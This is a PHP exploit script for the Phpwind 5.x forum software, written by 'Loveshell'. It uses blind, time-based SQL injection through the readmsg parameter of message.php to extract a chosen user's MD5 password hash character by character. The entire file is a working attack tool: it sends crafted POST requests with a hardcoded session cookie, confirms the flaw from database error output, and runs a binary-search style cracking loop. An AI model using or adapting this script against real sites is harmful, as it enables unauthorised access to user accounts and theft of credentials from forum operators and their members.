<?php
print_r("

+------------------------------------------------------------------+

Exploit For Phpwind 5.X Version
BY  Loveshell
Just For Fun :)

+------------------------------------------------------------------+
");


ini_set("max_execution_time",0);
error_reporting(7);

$bbspath="$argv[2]";
$server="$argv[1]";
$cookie='8116e_lastfid=0; 8116e_ol_offset=9506; 8116e_ipstate=1172987862; 8116e_sid=53471b29; 8116e_winduser=VlpcDQI9UwMEUFUMAVNUVlUCBQFXVAUEAFAFAANTVgRSBgEFWlA%3D; 8116e_ck_info=%2F%09; 8116e_lastvisit=0%091172988018%09%2Findex.php%3F';
$useragent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)";

$uid=intval($argv[3])>0 ? intval($argv[3]):1;

echo "\r\n#Logging\t........";
if(islogin()) echo "Login Ok!\r\n";
else die("Not Login!\tCheck Your Cookie and Useragent!\r\n");


echo "#Testing\t........";
if(test()) echo "Vul!\r\n";
else die("Not Vul");


$hashtable='0123456789abcdef';
$count=0;

echo "#Cracking\t\r\n\r\n";

for($i=1;$i<=16;$i++){
	echo "µÚ\t$i\tÎ»:";
	$subpass=crack($i+8);
	$password=$password.$subpass;
	echo "$subpass\r\n";
}
	
echo "Password:\t$password";

echo "\r\nGood Luck $count Times\r\n";


function send($cmd,$path)
{
  global $bbspath,$server,$cookie,$count,$useragent,$debug,$evilip;

  $path=$bbspath."$path";
  $message = "POST ".$path." HTTP/1.1\r\n";
  $message .= "Accept: */*\r\n";
  $message .= "Accept-Language: zh-cn\r\n";
  $message .= "Referer: http://".$server.$path."\r\n";
  $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
  $message .= "User-Agent: ".$useragent."\r\n";
  $message .= "Host: ".$server."\r\n";
  $message .= "Content-length: ".strlen($cmd)."\r\n";
  $message .= "Connection: Keep-Alive\r\n";
  $message .= "Cookie: ".$cookie."\r\n";
  $message .= "\r\n";
  $message .= $cmd."\r\n";

  $count=$count+1;
  $fd = fsockopen( $server, 80 );
  fputs($fd,$message);
  $resp = "<pre>";
  while($fd&&!feof($fd)) {
  $resp .= fread($fd,1024);
  }
  fclose($fd);
  $resp .="</pre>";
  if($debug) {echo $cmd;echo $resp;}
//  echo $resp;
  return $resp;
}


function sqlject($sql){
	global $uid;
	$data='action=pubmsg&readmsg=0)';
	$data=$data." union select BENCHMARK(1000000,md5(12345)) from pw_members where uid=$uid and $sql".'/*';
	$echo=send($data,'message.php');
	preg_match("/Total (.*)\(/i",$echo,$matches);
	if($matches[1]>2) return 1;
	else return 0;
}

function test(){
	global $uid;
	$data='action=pubmsg&readmsg=0)';
	$echo=send($data,'message.php');
	if(strpos($echo,'MySQL Server Error'))	return 1;
	else return 0;
}

function islogin(){
	global $uid;
	$data='action=pubmsg&readmsg=0)';
	$echo=send($data,'message.php');
	if(strpos($echo,'login.php"')) return 0;
	else return 1;
}

function crack($i){
global $hashtable;

$sql="mid(password,$i,1)>0x".bin2hex('8');
if(sqlject($sql)){
	$a=8;
	$b=15;}
else {
	$a=0;
	$b=8;
}


for($tmp=$a;$tmp<=$b;$tmp++){
	$sql="mid(password,$i,1)=0x".bin2hex($hashtable[$tmp]);
	if(sqlject($sql)) return $hashtable[$tmp];
}
crack($i);
}
?>
